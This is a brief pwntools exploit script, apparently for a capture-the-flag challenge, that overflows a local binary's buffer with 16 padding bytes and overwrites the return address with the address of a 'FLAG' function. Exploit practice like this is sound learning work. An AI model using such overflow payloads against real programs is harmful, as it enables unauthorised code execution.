from pwn import *

r = process('./run')
gdb.attach(r)

FLAG = 0x4011a7
WRITE = 0x401196
r.sendline(16 * b'a' +  p64(FLAG))
r.interactive()
